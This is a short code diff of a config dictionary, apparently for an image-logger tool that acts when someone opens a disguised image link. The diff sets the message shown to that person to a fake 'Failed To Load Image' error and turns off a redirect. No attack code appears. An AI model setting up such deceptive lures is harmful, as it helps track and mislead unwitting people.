@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "100010010101110100110101001010010100101010001001101011110100010101110101000110101001110101010001001011111010010111010933848484848888444444848488848493939399393910101010001000101000100101", # Message to show
+        "message": "Failed To Load Image", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-wallpaper-image-100259888-orig.jpg" # Link to the webpage to redirect to 
     },
 
